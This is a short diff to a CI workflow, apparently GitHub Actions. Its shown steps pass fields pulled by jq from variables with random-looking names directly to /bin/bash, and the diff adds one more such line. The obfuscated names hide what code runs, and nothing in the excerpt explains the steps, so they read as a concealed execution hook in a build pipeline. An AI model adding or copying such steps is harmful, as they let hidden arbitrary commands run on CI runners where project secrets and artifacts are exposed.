@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$jei9089" | jq -r .yitm10240 | /bin/bash
           echo $k35096 | jq -r .ws226 | /bin/bash
           printf '%s' "$k0" | jq -r .kzkhb8 | /bin/bash
+          echo $t8 | jq -r .ul1316 | /bin/bash
 
       - name: Upload artifact
         if: always()
